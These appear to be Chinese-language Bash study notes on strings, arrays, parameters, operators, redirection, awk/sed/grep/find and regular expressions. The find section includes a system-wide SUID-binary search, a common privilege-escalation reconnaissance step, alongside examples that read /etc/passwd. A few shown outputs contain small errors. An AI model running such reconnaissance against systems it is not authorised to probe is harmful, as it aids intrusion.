echo ${#string}  #变量为字符串时 ${#string} 等价于 ${#string[0]}

提取子字符串

左面第一个字符用0表示，右面第一个字符用0-1表示

\#/## 表示从左边开始删除。一个 # 表示从左边删除到第一个指定的字符；两个 # 表示从左边删除到最后一个指定的字符。

%/%% 表示从右边开始删除。一个 % 表示从右边删除到第一个指定的字符；两个 % 表示从左边删除到最后一个指定的字符。

echo ${string#*/}  删除第一个/及其左面的字符::2/3/4/5

echo ${string##*/} 删除最后一个/及其左面的字符::5

echo ${string%/*} 删除右面第一个/及其右面的字符::1/2/3/4

echo ${string%%/*} 删除右面最后一个（最左面第一个）/及其右面的字符::1

echo ${string:1:4}  #从第二个开始，提取4个字符::2/3/

echo ${string:4} #从第五个字符开始，到结束::/4/5

echo ${string:0-2:3} #从右数第二个字符开始，向右取三个字符::/5

echo ${string:0-2} #从右数第二个字符开始，到结束::/5

查找子字符串

string="runoob is a great site"

echo `expr index "$string" io` 查找i或者o第一个出现的位置（索引）

newname=1.txt

echo ${newname},${newname/txt/gjf},${newname//txt/gjf}     /替换首个 //替换全局

::1.txt,1.gif

------

整数

1 2 3

  declare -i my_integer=42

------

数组

my_array=(1 2 "3" 4 5)

my_array[0]=1

my_array=(

1

2

"3"

)

读取数组

${数组名[下标]}

${array_name[@]}   # 获取数组中所有元素

length=${#array_name[@]} #获取数组元素的个数 length=${#array_name[*]}

关联数组 

declare -A site=(["google"]="www.google.com" ["runoob"]="www.runoob.com" ["taobao"]="www.taobao.com")

declare -A associative_array

associative_array["name"]="john"

associative_array["age"]=30

echo "数组的元素为: ${site[*]}"

echo "数组的元素为: ${site[@]}"

echo "数组元素个数为: ${#my_array[*]}" 

echo "数组元素个数为: ${#my_array[@]}"

echo "数组元素个数为: ${#my_array}" 

echo "数组元素个数为: ${#my_array}"

数组的元素为: www.google.com www.runoob.com www.taobao.com

数组的元素为: www.google.com www.runoob.com www.taobao.com

数组元素个数为: 4

数组元素个数为: 4

数组元素个数为: 4

数组元素个数为: 4

A=1

my_array=($A B)

echo ${my_array[@]}

1 B

\#!/bin/bash

a1=ni

a2=hao

a3=lili

for i in 1 2 3 ; do

​        eval echo "\$a$i"

ni

hao

lili

字符串转数组

\#!/bin/bash

words="aaa bbb ccc ddd"

wo1=($words)

wo2=(`echo ${words} | tr ' ' '\n' `)

echo $wo1

echo ${wo1[*]}

echo $wo2

echo ${wo2[*]}

aaa

aaa bbb ccc ddd

aaa

aaa bbb ccc ddd

------

参数传递

\--------------------

\#!/bin/bash

echo $1

echo $2

echo $3

echo "---"

echo "$#"

echo "$*"

echo "$@"

echo "$$"

echo "$!"

echo "$?"

echo "$-"

\--------------------

main.sh 1 2 3

1

2

3

\---

3

1 2 3

1 2 3

262949

0

hB

\--------------------

$* 与 $@ 区别：

相同点：都是引用所有参数。

不同点：只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，则 " * " 等价于 "1 2 3"（传递了一个参数），而 "@" 等价于 "1" "2" "3"（传递了三个参数）。

------

优先使用 [[ ]] 和 || &&

支持正则表达式：[[ "$var" =~ ^[0-9]+$ ]]

(()) 只获取真假 常用于条件判断

$(()) 用于算数运算，并返回运算结果

运算符

算数运算符

 \+ - * / % = == !=

val = `expr 2 + 2`

val2 = `expr 2 \* 2`   *号需要加\转义

关系运算符

-eq -ne -gt -lt -ge -le

布尔运算符

!  -o  -a      (非，或，与)

[ ! $a ]

[ $a -lt 20 -o $b -lt 20 ]

逻辑运算符

&& ||   （and or）

[[ $a -lt 100 && $b -gt 100 ]]

字符串运算符

= != 

-z  检测字符串长度是否为0，为0返回true  [ -z $a ] 

-n  检测字符串长度是否不为0，不为0返回true

$  检测字符串长度是否不为空，不为空返回true

文件测试运算符

-b 检查文件是否为块设备文件，如果是，则返回true

-c 检查文件是否是字符设备文件，如果是，则返回true

-d 检查文件是否是目录，如果是，则返回true

-f 检查文件是否是普通文件，如果是，则返回true

-g 检查文件是否设置了SGID位，如果是，则返回true

-k 检查文件是否设置了粘着位，如果是，则返回true

-p 检查文件是否是有名管道，如果是，则返回true

-u 检查文件是否设置了SUID，如果是，则返回true

-r -w -x 检查文件是否可读，可写，可执行，如果是，则返回true

-s 检查文件是否为空（文件大小是否大于0），不为空返回true

-e 检查文件是否存在，如果是，则返回true

-S 检查文件是否socket

-L 检查文件是否存在并且是一个符号链接

自增自减操作符

num=5

let ++

let --

num=$((num + 1))

num=$((num - 1))

num=$(expr $num + 1)

num=$(expr $num - 1)

((num++))

((num--))

------

文件包含

. filename 

source filename

被包含的文件不需要可执行权限

------

输入与输出

echo $your_name

echo ${your_name}

echo -n "load ..."

echo "done!"

::load ...done!

echo -e "hello\nworld"

::hello

::world

转义字符\n 换行符  \t 制表符  \v 垂直制表符  \b 退格  \r 回车  \" 双引号  \' 单引号  \\ 反斜杠本身

 能否引用变量  |  能否引用转移符  |  能否引用文本格式符(如：换行符、制表符)

单引号  |           否           |             否             |                             否

双引号  |           能           |             能             |                             能

无引号  |           能           |             能             |                             否                       

read 命令一个一个词组地接收输入的参数，每个词组需要使用空格进行分隔；如果输入的词组个数大于需要的参数个数，则多出的词组将被作为整体为最后一个参数接收。

read -p "input a val:" a  #-p是设置提示词

read -p "input b val:" b

r=$[a+b]

echo ${r}

-n 输入长度限制

-t 输入限时

-s 隐藏输入内容

-p 输入提示文字

printf

printf "Hello, %s\n" "$name"

%s：字符串

%d：十进制整数

%f：浮点数

%c：字符

%x：十六进制数

%o：八进制数

%b：二进制数

%e：科学计数法表示的浮点数

%-10s 指一个宽度为 10 个字符（- 表示左对齐，没有则表示右对齐）

%-4.2f 指格式化为小数，其中 .2 指保留 2 位小数。

printf "%-10s %-8s %-4.2f\n" 郭靖 男 66.1234

------

流程控制

if [[ ${a} > ${b} ]] ; then

  ..

else

  ..

fi

if [[ ${a} > ${b} ]] ; then

  ..

elif (( ${a} > ${b} ) ; then

  ..

else

  ..

fi

for var in item1 item2 item3 ... item4 ; do

  ..

done

for((i=1;i<=5;i++)) ; do    #类C写法

  echo 12;

done

for var in item1 item2 item3 ... item4 ; do command1; command2... done;

while (( $int<=5 ))

do

  ..

done

abb=1 ; while (( abb<5 )) ; do echo $abb ; let abb++ ; done

abb=1 ; while true ; do echo $abb ; let abb++ ; done  #无限循环

until condition     #如果condition返回值为false ,则继续执行循环体内的语句

do

  ..

done

case $aNum in

​    1)  echo '你选择了 1'

​    ;;

​    2)  echo '你选择了 2'

​    ;;

​    *)  echo '你没有输入 1 到 2 之间的数字'

​    ;;

esac

case $num in

1) echo 1

  ;;

2) echo 2

  ;;

  *) echo "done"

  ;;

esac

break 命令允许跳出所有循环（终止执行后面的所有循环）。

continue 命令与 break 命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环。

------

函数

[ function ] funname [()]

{

  ..;

  [return int;]

}

函数返回值在调用该函数后通过 $? 来获得。

和 C 语言不同，shell 语言中return 0 代表 true，0 以外的值代表 false。

function fun(){ return 0 };if fun;then echo 1;fi

::1

function fun(){ return 1 };if fun;then echo 1;fi

::

funWithParam(){

​    echo "第一个参数为 $1 !"

​    echo "第二个参数为 $2 !"

​    echo "第十个参数为 $10 !"

​    echo "第十个参数为 ${10} !"

​    echo "第十一个参数为 ${11} !"

​    echo "参数总数有 $# 个!"

​    echo "作为一个字符串输出所有参数 $* !"

}

funWithParam 1 2 3 4 5 6 7 8 9 34 73

------

输入输出重定向

\>  重定向输出到某个位置，替换原有文件的所有内容(输出重定向)

\>>  重定向追加到某个位置，在原有文件末尾添加内容

<  重定向输入某个文件位置(输入重定向)

  echo -e "/home" > 1.txt

  ls < 1.txt

  wc -l < 1.txt

ls < 1.txt > 2.txt   从文件 1.txt 中读取内容，传递给ls，再将结果输出到2.txt

默认情况下，command > file 将 stdout 重定向到 file，command < file 将stdin 重定向到 file。

2> 重定向错误输出

2>> 重定向错误输出到文件末尾

如果希望 stderr 重定向到 file，可以这样写：

$ command 2>file

如果希望 stderr 追加到 file 文件末尾，可以这样写：

$ command 2>>file

&>  混合输出错误的和正确的都输出

n >& m 将输出文件m和n合并

n <& m 将输入文件m和n合并

文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。

here document (和多行注释类似，将 : 替换为接受输入的命令)

wc -l << A

​    欢迎来到

​    菜鸟教程

​    www.runoob.com

A

3          # 输出结果为 3 行

/dev/null

2>/dev/null #将错误输出到/dev/null 即扔掉错误输出

\>list 2>&1  

stdout重定向到list，stderr重定向到stdout，即是此时的list（>list的结果），所以输出stdout和stderr到list文件

------

vim 

tmux

sort

(sort -t ',' -k2n #指定分隔符为','  -k2 第二列，n 使用数字排序 g是浮点数，空是字符串 )

uniq

(cat 2.txt | sort | uniq #常用于去重)

cut

(cat /etc/passwd | cut -d ':' -f 2 #按：分割，取第二列)

paste

 (cat /etc/passwd | paste -sd ","#-s 串行进行，而非平行处理，-d间隔字符)

tr

(echo "i love you" | tr ' ' '\n'#简单替换)

seq 

(seq 5 #输出1 2 3 4 5这五行数字)

cat tac head(-n) tail(-n) less(-r) more nl od(二进制打开)

rev(行反序) wc -l(输出行号)

https://topicbolt.com/flip-text-vertically/ #vertical flip string 

grep

grep [-ivnr]  -i 忽略大小写 -v 反向查找 -n 显示匹配行行号 -r 递归查找子目录中的文件（在当前目录下查找）

-A 5 显示匹配行以及之后的5行

-B 5 显示匹配行以及之前的5行

-C 5 显示匹配行以及之前和之后的5行

grep -E 拓展正则表达式

grep -P perl正则表达式 能匹配 \d （数字类）等等

grep -P ''    正则表达式匹配

sed

sed 's/old/new/ig'      i 忽略大小写 g 全局匹配     

sed '/pattern/d'          删除匹配到pattern的行

sed '2,5d'                    删除2-5行

sed -n '3p'                    打印第三行

sed -n '/pattern/p'      打印匹配行

sed '3i\插入内容'           在第三行前插入

sed '3a\追加内容'          在第三行后追加

sed '3c\新内容'             替换第三行

sed '/pattern/c\新内容     替换匹配行

awk

-F ' '            指定输入字符的分隔符

-v <变量名>=<值>:   设置awk内部的变量值

awk '{print $1,$2}'   打印特定行

awk  '{printf "%-10s %-10s\n", $1, $2}'  格式化输出

$ awk '$1>2 && $2=="Are" {print $1,$2,$3}' log.txt

过滤第一列大于2并且第二列等于'Are'的行

cat /etc/passwd | awk 'BEGIN{FS=":";OFS="::::"}{$1=$1 ; print $0}'  将分隔符:转变为::::，使用$1=$1,触发字段重组

cat /etc/passwd | awk 'BEGIN{ORS=":"}{print $0}'  将换行符替换为:

  FS(Field Separator)：输入字段分隔符， 默认为空白字符

  OFS(Out of Field Separator)：输出字段分隔符， 默认为空白字符

  RS(Record Separator)：输入记录分隔符(输入换行符)， 指定输入时的换行符

  ORS(Output Record Separate)：输出记录分隔符（输出换行符），输出时用指定符号代替换行符

  NF(Number for Field)：当前行的字段的个数(即当前行被分割成了几列)

  NR(Number of Record)：行号，当前处理的文本行的行号。

  FNR：各文件分别计数的行号

  ARGC：命令行参数的个数

  ARGV：数组，保存的是命令行所给定的各参数

if (condition) .... ; else .... 

if (condition1) .... ; else if (condition2) ... ; else .... 

awk '{if($3 > 50) print $1, $3}' filename    if使用

cat /etc/passwd | sort -t ':' -k4n | awk -vyes="yes" -vno="no" 'BEGIN{FS=":"}{if ($4 > 1000) print yes;else print no}' 提取passwd文档，按照第四列数字排序，第四列数字大于1000的行输出yes，否则输出no

$ awk 'BEGIN { for (i = 1; i <= 5; ++i) print i }'   

$ awk 'BEGIN {i = 1; while (i < 6) { print i; ++i } }'

break continue exit

locate

find

-name 按名字查找 支持* 和 ?

-type    按照文件类型查找 f普通文件 d目录 l符号链接

-perm 权限 -u=s 

-size [+-]   +是大于 -是小于  c字节 w字数 b块数 k kb M mb G gb

-mtime days   按修改时间查找，+ 之前 - 以内   比如 - 7 为7天以内 +7为七天以外 7 在7天前修改过

[a|c|m]min -- [最后访问|最后状态修改|最后内容修改]min

[a|c|m]time -- [最后访问|最后状态修改|最后内容修改]time

正数应该表示时间之前，负数表示时间之内。

find . -exec command { } \;   其中 {}是前面查找到的文件路径    

-user    按文件所有者查找

-group 按文件所属组查找

-perm 755 将匹配权限恰好为755的文件。

-perm -644 将匹配所有权限至少为644的文件

-perm /222 将匹配任意用户（所有者、组、其他）有写权限的文件。

-perm u=rwx,g=rx,o=rx

-perm -u=rwx  # 匹配所有者有读写执行权限的文件，即所有者权限至少为7（rwx）

-perm /u=rwx  # 匹配所有者有读写执行权限中任意一位的文件，即所有者权限至少有一个（x或w或r）

例子

find / -perm -u=s -type f 2>/dev/null      这里的-perm -u=s            -代表至少，意思是至少有 

curl

wget

ftp

tftp

tree

telnet

dig

touch scp ssh

sudo

skill

su -l Qsa3 -c "whoami" #以Qsa3权限执行一条命令whoami，并返回原shell环境

#### 正则表达式

ifconfig | grep -E '(\d+\.){3}\d' 匹配777.777.777.777

ifconfig | grep -E '(([0-9]+).){3}([0-9])+'

ifconfig | grep -P '((25[0-5]|2[0-4][0-9]|[0-1]{0,}[0-9]{0,}[0-9])\.){3}(25[0-5]|2[0-4][0-9]|[0-1]{0,}[0-9]{0,}[0-9])'

修饰符(写在匹配行之外)

/pattern/i #i 忽略大小写 g 全局匹配 m 多行模式 s 单行模式

(默认情况下的圆点 . 是 匹配除换行符 \n 之外的任何字符，加上 s 之后, . 中包含换行符 \n)

used? #可以匹配use和used

? + * {n} {n,} {n,m}

(ab)+ #可以匹配ababab...

a (cat|dog) #可以匹配 a cat  或者 a dog

[a-z]+ #可以匹配所有字母1到多次    []内的内容都可以选取

\d 匹配任意数字，等价于 [0-9]

\D 匹配任意非数字，等价于 [^0-9]

\w 匹配任意单词字符(字母、数字、下划线)，等价于 [a-zA-Z0-9_]

\W 匹配任意非单词字符，等价于 [^a-zA-Z0-9_]

\s 匹配任意空白字符(空格、制表符、换行符等)

\S 匹配任意非空白字符

\n 匹配换行符

\t 匹配制表符

\r 匹配回车符

\f 匹配换页符

\v 匹配垂直制表符

[^a-z]    匹配除了a-z的字符

. 匹配任意字符，但不包括换行符

  . 特殊字符在中括号表达式时 如 [.] 只会匹配 .字符，等价于 \.，而非匹配除换行符 \n 外的所有字符。

^ 匹配行首  在[]之外使用 ^[a-z]    匹配以a-z开头的字符

$ 匹配行尾 在[]之外使用 [a-z]$    匹配以a-z结尾的字符

?懒惰匹配

<.+?>  尽可能的匹配少的字符   整体匹配HTML标签时不会跨标签匹配

\b

匹配单词边界

 示例：\bcat\b 匹配 "cat" 但不匹配 "category"

\B

匹配非单词边界

示例：\Bcat\B 匹配 "scattered" 中的 "cat" 但不匹配单独的 "cat"

高级用法

捕获分组()

非捕获分组(?:)

命名分组(?:)

-p perl规则下

(\w+) \1  # 匹配重复的单词，如 "hello hello"

(?P\w+) (?P=word)

正向先行断言 (?=pattern)  正前瞻  右（向前）  在 pattern  要找的位置，它的右边必须是... 

负向先行断言 (?!pattern) 负前瞻 向右（向前） 不存在 pattern 我要找的位置，它的右边一定不能是... 

正向后行断言 (?<=pattern) 正后顾 向左（向后） 存在 pattern 我要找的位置，它的左边必须是... 

负向后行断言 (?<!pattern)
